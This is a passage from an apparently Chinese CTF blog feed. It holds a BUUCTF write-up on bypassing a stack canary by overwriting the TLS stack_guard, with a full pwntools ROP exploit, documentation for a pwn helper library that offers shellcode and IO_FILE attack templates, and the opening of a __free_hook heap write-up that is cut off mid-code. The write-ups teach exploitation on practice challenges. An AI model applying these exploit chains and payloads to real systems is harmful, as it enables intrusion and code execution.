class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>而上面的stack_guard也就是放到栈里的canary，而在程序里看见的这行代码</p><p><code>xor rdx, fs:28h</code>中的fs寄存器也就指向了TLS这个结构体，而偏移0x28的位置正好是stack_guard,canary是来自于内核生成的一个随机数。</p></li><li><p>最后要说一下这个子线程栈和父线程内存的关系。每个线程都会有自己单独的栈区，而子线程的栈区通常都是调用了mmap映射了一段内存。在父进程里我们依然可以看到这片内存，如下</p></li></ol><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272219862.png" alt="image-20221127221900131"></p><p>在父线程中依然可以看到这片内存，并且发现是mmap映射出来的区域，如下，所以子线程的栈区只是对于自己是私有的，这并不意味着其他线程访问不了，如果能拿到相关指针，依然可以对其操作。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272220056.png" alt="image-20221127222016217"></p><h2 id="保护策略">保护策略</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272224223.png" alt="image-20221127222402146"></p><h2 id="程序分析">程序分析</h2><p>主函数就是开了一个子线程出来，然后子线程去执行了这个函数</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272227552.png" alt="image-20221127222751474" style="zoom:50%;" /><p>而在子线程调用的这个函数，漏洞是很明显的栈溢出(如下)。特点是溢出的字节数很大。</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272228512.png" alt="image-20221127222845444" style="zoom:50%;" /><h2 id="利用思路">利用思路</h2><p>本程序是在子线程里有一个很大的栈溢出漏洞，而子线程的栈是mmap映射出来的内存，并且TLS位于栈的顶部(高地址)，这道题的关键就是绕过canary保护。因为最后canary会和fs:0x28的值去比较，而fs就是TLS的首地址，0x28的位置就是stack_guard(canary就是拷贝的这个值放到的栈里)。因此我们在子线程里栈溢出去控制TLS里的stack_guard，让其和canary的值一样即可。</p><p><strong>如果想要在gdb中获取子线程TLS的首地址可以执行<code>x/x pthread_self()</code>来查看</strong>。</p><p>剩下的思路就是先控制rbp为bss段地址，接着执行puts函数泄露libc地址，再控制执行流调用read函数，将one_gadget读入到bss段(因为执行system函数会出现一些错误),最后执行leave;ret将栈迁移到bss段，劫持执行流到刚才读入的one_gadget上。</p><h2 id="EXP">EXP</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29028&quot;</span>,<span class="string">&quot;buu64-libc-2.27.so&quot;</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400c03</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000400c01</span></span><br><span class="line">leave_ret=<span class="number">0x0000000000400955</span></span><br><span class="line">debug(p,<span class="number">0x400A7D</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;How many bytes do you want to send?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1850</span>))</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1008</span>+p64(<span class="number">0xdeadbeef</span>)<span class="comment">#0xdeadbeef is canary</span></span><br><span class="line">payload+=p64(<span class="number">0x602030</span>-<span class="number">8</span>+<span class="number">0x180</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(<span class="number">0x602030</span>+<span class="number">0x180</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;read&#x27;</span>])+p64(leave_ret)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1848</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)<span class="comment">#TLS stack_guard</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">libc_base=recv_libc()-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(libc_base+search_og(<span class="number">1</span>)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272253954.png" alt="image-20221127225322550"></p><h2 id="参考文章">参考文章</h2><p><a href="https://kiprey.github.io/2022/08/thread_canary/">浅析 Linux 程序的 Canary 机制 | Kiprey’s Blog</a></p><p><a href="https://eternalsakura13.com/2018/04/24/starctf_babystack/">thread stack bypass canary和sixstar ctf babystack writeup | Sakuraのblog (eternalsakura13.com)</a></p><p><a href="http://liupzmin.com/2019/09/30/concurrence/tls-summary/">初识Thread Local Storage 兔子先生</a></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> 栈迁移 </tag>
            
            <tag> 篡改TLS中stack_guard </tag>
            
            <tag> 绕过canary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tools-函数库</title>
      <link href="/posts/ad411136.html"/>
      <url>/posts/ad411136.html</url>
      
        <content type="html"><![CDATA[<p>我和我的同学 <a href="https://www.cnblogs.com/trunk/">trunk</a> 写了一些方便解PWN题的<s>鸡肋</s>函数封装到了这个库里，第一是平常用起来方便顺手，第二顺便练习下编程能力，第三如果以后有可能的话，希望逐渐做成像 <strong>roderick</strong> 师傅的<a href="https://github.com/RoderickChan/pwncli">pwncli</a>那样。</p><p><a href="https://github.com/ZIKH26/tools/blob/master/tools.py">源代码</a></p><p>一条命令下载 <code>tools</code> 函数库</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ZIKH26/tools/master/tools.py</span><br></pre></td></tr></table></figure><p><strong><code>tools</code> 库只支持python3</strong></p><h2 id="命令行参数：">命令行参数：</h2><p>为了不在打远程和本地，以及打本地时是否开启调试选择中来不断的更改脚本，因此我设置了命令行参数来直接做切换。</p><p>1 去打远程且不开启脚本中的调试</p><p>2 打本地且不开启脚本中的调试</p><p>如果不加命令行参数，则默认打本地，若有debug函数则自动开启调试。</p><p>假设你现在想打远程</p><p>那么你需要在脚本里写<code>p,e,libc=load(&quot;heap&quot;,&quot;node4.buuoj.cn:27339&quot;)</code> (程序名和ip&amp;port请自行更改，这里只是举例说明)</p><p>然后运行脚本时使用命令 如下(即使脚本中有debug函数也不影响打远程)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 exp.py 1</span><br></pre></td></tr></table></figure><p>如果打本地时，不想去让脚本执行debug函数，那么命令可以如下(这样的好处是即使脚本中存在debug函数，但不想在本次执行脚本时debug也不需要来回去脚本里注释了)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exp.py 2</span><br></pre></td></tr></table></figure><p><strong>如果直接运行exp.py的话，即使脚本里存在ip和port也不会去打远程</strong></p><p>此外，假设你打本地所依赖的libc是2.23-0ubuntu11.3版本 而远程服务器程序所依赖的libc是2.23-0ubuntu11版本。二者仅仅是小版本有细微的不同，可能one_gadget和一些libc里函数的偏移有点不同，如果来回去修改的话，有点麻烦，因此在load函数的第三个参数可以设置远程依赖的libc，这样用后面search_og函数或者libc.symbols找的函数地址都会自动切换到远程所依赖的libc。</p><p>示例如下:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29026&quot;</span>,<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="各个函数的使用说明">各个函数的使用说明</h2><h3 id="long-search-local-search">long_search&amp;local_search</h3><p>作用：这两个函数就是去libc中寻找system函数和/bin/sh的地址（分别用于本地和远程）<br>优点：将用LibcSearcher搜索并装载的重复的代码都放到了函数内部，现在一行就可以获取system和/bin/sh地址，因此您的脚本看起来更为简洁。</p><p>使用范例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr,libc)</span><br><span class="line"><span class="string">&quot;&quot;&quot;libc指的是装载本地的libc,例如在脚本开始声明&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="log">log</h3><p>作用：这个函数就是单纯的打印一下某些变量的信息，类似于日志（但我更建议去使用下面的log_addr函数）<br>优点：加了箭头和字体颜色效果，可以更清楚的打印所需要的信息</p><p>使用范例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts=<span class="number">123456</span></span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,puts_addr)</span><br></pre></td></tr></table></figure><h3 id="log-addr">log_addr</h3><p>如果你仅仅是想看一下变量对应的值是否是你需要的那个地址，同时感觉上面这个log函数太麻烦还需要两个参数，那么你不妨试试log_addr函数。</p><p>作用:log_addr是专门为展示地址设计的（因为它会自动将变量以16进制的形式打印)</p><p>优点：<strong>只传一个变量名字即可同时返回的是以十六进制表示的变量</strong>，但是没有log函数灵活。</p><p>使用前提：你要确保变量是int类型的，那么你仅仅传入<strong>字符型的<u>变量名字</u></strong>（不是变量）</p><p>使用范例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_addr=123456</span><br><span class="line">log_addr(&#x27;puts_addr&#x27;)</span><br></pre></td></tr></table></figure><p>使用效果：<br><img src="../img/MRYBXkvlcL5Kj6t.png" alt=""></p><h3 id="log-info">log_info</h3><p>如果仅仅是打印一个参数的话，可以使用log_info函数。</p><p>作用：打印调试信息</p><p>优点：前面加了[*]，使调试信息更加明显，让你更快的找到你想看见的信息。</p><p>适用情况：比如你发现u32(p.recv(4))得到的地址不对，你想要看看p.recv()到底接收了什么，那么你就可以这么写log_info(p.recv())。</p><p>使用范例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_info(p.recv())</span><br></pre></td></tr></table></figure><p>使用效果：</p><p><img src="../img/jP81hQByfWJlrTH.png" alt="image-20220729201555971"></p><h3 id="debug">debug</h3><p>作用：在脚本中下断点进行调试<br>优点：1、如果使用tmux，可以直接分三屏，效果如下图。您仅仅只需要在脚本中加入这个函数，运行脚本的时候就可以自动分出三块屏幕(调试具体信息占屏幕的右侧，左上是脚本的debug执行信息，左下则可以继续使用)，左下角的区域完全可以去对着脚本进行调试。<br><img src="../img/7cIP89qwUyT2umG.png" alt=""></p><p>2、可以很简洁的输入地址，即可完成下断点的工作，同时开了pie保护的话，也可以正常去下断点</p><p>使用说明：<br>这个函数还是比较常用的，适用于tmux的终端，只需要在最开始传递一下process函数返回的对象，接着就可以直接下断点了（默认使用tmux），如果开启了PIE保护的话，需要声明一下pie（也就是加一个参数’pie’）即可继续下断点。<br>如果不使用tmux也没问题，可以加入参数no-tmux就可以正常使用这个函数（<strong>如果使用no-tmux，则这个参数必须是放在第二个参数的位置</strong>（第一个参数始终是process的返回值）</p><p>如果直接使用debug()函数，参数只有process函数返回的对象的话，则默认使用tmux终端，执行分三屏命令，最后执行gdb.attach§<br>PS：这个函数可以放到脚本的任何位置（必须要保证当前位置的下面还有一行不会触发报错的代码），这样可以从脚本当前的位置去开始调试，同时配合下的断点可以使调试更高效。<br>使用范例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">debug(p,<span class="number">0x400ECD</span>,<span class="number">0x400F54</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;使用tmux，下两个断点&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;no-tmux&#x27;</span>,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x248</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;不使用tmux，程序开了pie，用偏移来下断点&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">debug(p)</span><br><span class="line"><span class="string">&quot;&quot;&quot;使用tmux，执行gdb.attach(p)&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="load">load</h3><p>作用:写入目标程序的名字，将返回p(process的返回值),e(当前ELF文件的信息),libc(ELF文件所依赖的libc文件的信息)。ps：如果是静态链接的程序，那么只会执行p=process或者p=remote然后直接返回p。</p><p>也就是相当于执行了原来的p=process(‘xxx’) e=ELF(‘xxx’) libc=ELF(‘xxx’)。如果传入了ip和port的话，则会执行remote(ip,port)代替原本的process。这样就可以直接打远程了</p><p>优点:将原本重复的代码写在了函数内部，现在只要调用load函数，传入函数名即。同时该函数也获取了libc的信息将其存为了全局变量，为了之后获取one_gadget的函数直接使用。</p><p>使用范例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p,e,libc=load(<span class="string">&#x27;program&#x27;</span>)<span class="comment">#这是打本地，动态链接的程序</span></span><br><span class="line">p=load(<span class="string">&#x27;program&#x27;</span>)<span class="comment">#这是打本地，静态链接的程序</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;program&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28822&quot;</span>)<span class="comment">#这是打远程的情况，ip和port只需要用:分隔开即可。</span></span><br></pre></td></tr></table></figure><h3 id="shellcode-store">shellcode_store</h3><p>我封装了一些shellcode放到了tools里面，可以使用shellcode_store函数来进行使用。</p><p>作用：参数设置为需要的shellcode类型，返回对应的shellcode</p><p>使用范例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode=shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)<span class="comment">#返回64位获取shell的shellcode</span></span><br><span class="line">shellcode=shellcode_store(<span class="string">&#x27;orw_32&#x27;</span>)<span class="comment">#返回32位执行open,read,write读出flag的shellcode</span></span><br><span class="line">shellcode=shellcode_store(<span class="string">&#x27;str_rax&#x27;</span>)<span class="comment">#返回起始的跳转寄存器为rax的字符型shellcode</span></span><br></pre></td></tr></table></figure><p>PS：获取shell和orw的我都写了64位和32位的shellcode（应该是最短字节的了），纯字符的shellcode我几乎只生成了针对于x64的各个寄存器，其他没有生成那么多（因为感觉平常很少用到），等以后用到没有生成过的再记录上来吧。</p><h3 id="search-og">search_og</h3><p>作用：不需要手动将one_gadget工具获取的one_gadget再复制粘贴到脚本中了，可以直接通过这个函数来获取one_gadget,参数为想获取对应的one_gadget在列表中的索引。</p><p>注意:这个函数依赖了one_gadget这个工具以及load函数，因此必须要保证当前拥有one_gadget工具并且脚本中使用了load函数才行。</p><p>使用范例:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">one_gadget=search_og(<span class="number">1</span>)</span><br><span class="line">p.sendline(p64(one_gadget+libc_base))</span><br></pre></td></tr></table></figure><p>使用效果：<br><img src="../img/2706180-20220821171240306-943254837.png" alt=""></p><h3 id="攻击模板">攻击模板</h3><h4 id="obstack-attack">obstack_attack</h4><p>作用: 这个函数是提前布局好的一个 <code>IO_FILE</code> 模板（打的 <code>IO</code> 链是 <code>IO_obstack_jumps</code> 中 <code>_IO_obstack_xsputn</code> 函数），攻击效果可以任意地址执行并且可以控制第一个参数,这个函数的最终效果是执行 <code>system(&quot;/bin/sh&quot;)</code></p><p>适用版本: <code>glibc 2.36</code>及以下</p><p>利用条件:使用前提是泄露 <code>libc</code> 地址和堆地址 并且能任意地址写一个堆地址(最好是往 <code>IO_list_all</code> 里写一个堆地址) 且能从 <code>main</code> 函数正常返回或者触发 <code>exit</code> 函数</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123; <span class="string">&#x27;system&#x27;</span>:libc_base+<span class="number">0x50d60</span> ,<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx&#125;</span><br><span class="line">libc_symbols=create_dict(dirc)</span><br><span class="line"></span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure><p>使用方法: <code>heap_addr</code> 是写入 <code>IO_list_all</code> 中的堆地址( <code>chunk</code> 头地址)<br><code>libc_symbols</code> :是 <code>create_dict(dict)</code> 传入进来返回值（ <code>dirc</code> 是所需的参数字典）</p><p>返回值是构造好的 <code>payload</code></p><h4 id="obstack-orw1-attack">obstack_orw1_attack</h4><p>作用：这个函数就是在禁用了 <code>execve</code> 或者栈没对齐时使用的,攻击效果就是执行常规的 <code>orw</code>,和<code>obstack_attack</code> 不同的就是字典中多了几个成员</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123;<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;open&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;read&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;write&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;svcudp_reply&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;add_rsp&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;leave_ret&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rsi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdx_xxx&#x27;</span>:libc_base+xxx &#125;</span><br><span class="line"></span><br><span class="line">libc_symbols=create_dict(dirc) </span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure><p>使用方法: <code>heap_addr</code> 是写入 <code>IO_list_all</code> 中的堆地址( <code>chunk</code> 头地址)<br><code>libc_symbols</code> :是 <code>create_dict(dict)</code> 传入进来返回值（ <code>dirc</code> 是所需的参数字典）</p><p>返回值是构造好的 <code>payload</code></p><h4 id="obstack-orw2-attack">obstack_orw2_attack</h4><p>这个是上一个的升级版,区别就是将 <code>open</code> 换成了 <code>openat</code> （有时候可能沙箱会禁用掉 <code>open</code>）,并且关闭标准输入流，将文件描述符 <code>0</code>  作为 <code>flag</code> 文件的文描述符,避免本地通了，远程打不通</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123;<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;openat&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;close&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;read&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;write&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;svcudp_reply&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;add_rsp&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;leave_ret&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rsi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdx_xxx&#x27;</span>:libc_base+xxx &#125;</span><br><span class="line">libc_symbols=create_dict(dirc)</span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure><p>使用方法: <code>heap_addr</code> 是写入 <code>IO_list_all</code> 中的堆地址( <code>chunk</code> 头地址)<br><code>libc_symbols</code> :是 <code>create_dict(dict)</code> 传入进来返回值（ <code>dirc</code> 是所需的参数字典）</p><p>返回值是构造好的 <code>payload</code></p>]]></content>
      
      
      <categories>
          
          <category> 尝试开发小工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 编程 </tag>
            
            <tag> 小工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vheap--pwnhub五月公开赛</title>
      <link href="/posts/b7f5642c.html"/>
      <url>/posts/b7f5642c.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结：">总结：</h2><p>通过这道题的学习与收获有:</p><p>1、本题的核心是劫持__free_hook。利用memcpy溢出，更改free状态堆块的fd指针，将其改写完__free_hook的地址，然后申请回来，写入system地址，最终free掉存有/bin/sh的堆块获取shell。</p><p>2、学会了新技能——使用IDA新建结构体，同时分析了IDA中的宏，通过对这个宏取字节的分析又加深了对指针的理解<br>3、使用sprintf的格式化字符串漏洞泄露数据时，要考虑到format在第二个参数的影响，最后的距离栈顶的偏移只加5（并不考虑rdi寄存器）</p><p>4、做的第一道堆题，体会到了在堆块中布局来获取shell的思想。</p><h2 id="保护策略">保护策略:</h2><p><img src="../img/2706180-20220514175612986-253149422.png" alt=""></p><h2 id="程序分析">程序分析:</h2><h3 id="使用IDA创建结构体">使用IDA创建结构体</h3><p>打开最后一个函数，发现懵懵逼逼的。</p><p><img src="../img/2706180-20220514175619263-121762209.png" alt=""></p><p>请教了roderick师傅后才知道这里应该新建一个结构体进行分析，因为这里通过分析就是在取32位整数的四个字节（分析SBYTE1和SBYTE2、HIBYTE这几个宏观察出来的）。因为IDA生成伪代码的时候，并不能百分百的确认这是一个结构体，所以只能靠这种宏的形式展示出来，为了方便分析我们需要手动构造一个结构体。</p><p>首先创建结构体之前，必须要分析出来结构体里的成员数量和类型。</p><p>这个函数的形参是int类型的a1，而之后SBYTE2和HIBYTE、SBYTE1都是取的a1中的某一字节，因此猜测这个结构体是四个char类型的变量。</p><h4 id="创建结构体-方法1：">创建结构体 方法1：</h4><p><img src="../img/2706180-20220514175624982-2031282091.png" alt=""></p><p><img src="../img/2706180-20220514182146085-26007685.png" alt=""></p><p>然后输入结构体的名字</p><p><img src="../img/2706180-20220514180610163-205234172.png" alt=""></p><p>将光标点到ends上，然后按d</p><p><img src="../img/2706180-20220514180637568-1730011386.png" alt=""></p><p>先创建四个变量，然后将光标点到field_0上，按n，重命名</p><p><img src="../img/2706180-20220514180651445-1703543613.png" alt=""></p><p>最后将光标点到函数名上，按y，然后修改第二个红色框里的内容（改成结构体的名字，我这里是更改成value）</p><p><img src="../img/2706180-20220514180703104-1762048814.png" alt=""></p><p>效果如下：</p><p><img src="../img/2706180-20220514180712905-1869244594.png" alt=""></p><p>还有一种方法：</p><h4 id="创建结构体-方法2：">创建结构体 方法2：</h4><p><img src="../img/2706180-20220514180306157-2026482700.png" alt="image-20220513155653337"></p><p>然后右键插入</p><p><img src="../img/2706180-20220514180305556-1203311905.png" alt="image-20220513155758601"></p><p>然后编辑结构体即可</p><p><img src="../img/2706180-20220514180832544-593075132.png" alt=""></p><p>最后将原本的数据类型换成定义好的结构即可</p><p><img src="../img/2706180-20220514180849983-205219515.png" alt=""></p><p><img src="../img/2706180-20220514180901098-1038564234.png" alt=""></p><p>效果如下：</p><p><img src="../img/2706180-20220514180915039-1521065964.png" alt=""></p><p>不过改完之后发现还是懵懵逼逼，因为还有个奇怪的qword_202D00不知道在干嘛。按x看一下交叉引用，发现了下面的代码</p><p><img src="../img/2706180-20220514180927780-335719541.png" alt=""></p><p>这里看起来是在进行初始化，不过干啥用的还是懵懵逼逼。roderick师傅告诉我说，这里循环了16个次，回想起题目的名字是vheap（虚拟机堆题，这道题只模拟了寄存器和opcode），因此猜测这里是将所有的寄存器进行了初始化。因此我们将这个qword_202D68给重命名regs。</p><p>最后看起来舒服多了，分析着也比较方便。</p><p><img src="../img/2706180-20220514180938745-1280833798.png" alt=""></p><h3 id="存在格式化字符串漏洞">存在格式化字符串漏洞</h3><p><img src="../img/2706180-20220514180947642-1290198064.png" alt=""></p><p>因为开了PIE，想实现任意写是够呛了，只能利用一次，而且没有准备好的跳板，因此猜测这里应该是用来泄露函数真实地址以来获取libc基地址的。</p><p>然后此处进行了一次输入</p><p><img src="../img/2706180-20220514180959726-926685542.png" alt=""></p><p>最多输入2，接下来的循环最多跑三次，这个循环是从2020E0这里开始存一些数据。</p><p><img src="../img/2706180-20220514181007362-1502659209.png" alt=""></p><p>这里输入一个不大于9的数字，然后循环会跑对应的次数，不过这里看着有点懵，不知道有啥用，那就继续往后分析。</p><p><img src="../img/2706180-20220514181022124-806979207.png" alt=""></p><p>这个函数中的qword_202D78处于是bss段，存放的是0，通过循环每次+1，有点跟计数器一样，去不断的改变V1这个索引，来返回不同的值，索引是根据dword_202500找的，暂且记下，继续分析。</p><p>接下来就要分析最后的函数了。</p><p><img src="../img/2706180-20220514180304098-1657473361.png" alt="image-20220513201827044"></p><p>先是这个if不是太好过，卡了我很久。</p><h3 id="分析取一字节宏的实现">分析取一字节宏的实现</h3><p>这里换回原本的宏来说。就分析SBYTE1这一个宏吧。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SBYTE1(x)   SBYTEn(x,  1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n))</span></span><br><span class="line"><span class="keyword">typedef</span>          <span class="type">char</span>   int8;</span><br></pre></td></tr></table></figure><p>&amp;x 表示x的地址</p><p>(int8 *)&amp;x这个地址转换成char *类型，不过这个地址依然不变，变的仅仅是它的类型</p><p>*((int8 *)&amp;x+n)   +n代表在原本的地址上加n个内存单元的偏移，这个内存单元取决于什么？取决于指针指向的变量类型，因为被强转成了char *，因此现在的变量是char类型，所以+n就等同于x的地址+n字节，最终*取出指针对应的一字节的值。</p><p>为什么要强转成char *类型，不强转行不行？</p><blockquote><p>不行，强转成char *的目的是为了分别访问原本int类型变量的每个字节。不强转的话，+n就直接跳过了n个四字节的内存单元。</p></blockquote><p>因此得出结论SBYTE1的意思就是获取指定变量的第二字节（我是从低地址数的）。依次类推，SBYTE2就是获取第三字节，我们分别在结构体中把它们命名为two_byte、three_byte。</p><p>再拐过来看检查。</p><p><img src="../img/2706180-20220514180303868-1305720818.png" alt="image-20220513214802748"></p><p>这个就是需要变量a1的第一字节和第三字节，要大于等于0 小于等于2。看下a1是什么？</p><p>一顿溯源之后，发现它就是qword_202500靠偏移得出来的值，再溯源一下，看看我们是否对这个qword_202500进行了输入</p><p><img src="../img/2706180-20220514181132310-878458808.png" alt=""></p><p>下图中发现了，我们是可以控制dword_202500的值，因此这意味着我们可以控制输入的值的第一第三字节来绕过检查。</p><p><img src="../img/2706180-20220514181144499-886432126.png" alt=""></p><p><img src="../img/2706180-20220514180303512-502508280.png" alt="image-20220513215318327"></p><p><img src="../img/2706180-20220514181203734-401889871.png" alt=""></p><p><img src="../img/2706180-20220514180303249-943265363.png" alt="image-20220513215355579"></p><p>通过观察，发现了这三个核心函数，进入他们的条件就是控制第四字节的值即可。</p><h2 id="大致思路">大致思路:</h2><p>free函数执行后把指针给置空了，这里无法利用，那只能去观察memcpy函数了。观察memcpy函数的第一个参数，发现它和malloc返回的地址是一样的，这就意味着我们可以往&amp;unk_2020E0+64(__int64)a1.three_byte这个地址写入数据，然后复制给malloc中，可以复制0x40个字节，这里很明显存在溢出。</p><p>于是思路就是利用溢出修改当前chunk的下一个chunk(需要被free掉）的fd指针，然后我们再执行malloc时，是可以申请回来一个指定的地址。我们可以去修改__free_hook（free函数执行之前，会检查__free_hook，如果其值为NULL，则调用_int_free函数，否则调用__free_hook所指向的值）</p><p>申请回来之后，我们可以利用memcpy把system地址写入__free_hook所指向的地方。最后再把一个堆块里存入/bin/sh字符串，free掉这个堆块即可获取shell。</p><h2 id="调试来构建exp">调试来构建exp</h2><p>首先我们要先尝试去绕过下面这个if检查，并且尝试执行一下malloc函数，其他的暂时先随便输入即可。</p><p><img src="../img/2706180-20220514181218429-18861707.png" alt=""></p><p><img src="../img/2706180-20220514180302997-106339106.png" alt="image-20220514090631642"></p><p>观察上面执行malloc的情况，这个要求我们的最高字节是10，才能执行malloc，然后第三字节决定了malloc的大小（two_byte是从低字节数的，第三字节是从高字节数的），然后这个把malloc这个地址记录在a1.one_byte偏移这里。</p><p>我们暂定申请0x10大小的chunk，然后将one_byte设置成0，那目前的exp应该为下面这个？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xec6)\nc&#x27;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;first,tell me your name.\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many pieces of data?\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;10001000&#x27;</span>)</span><br><span 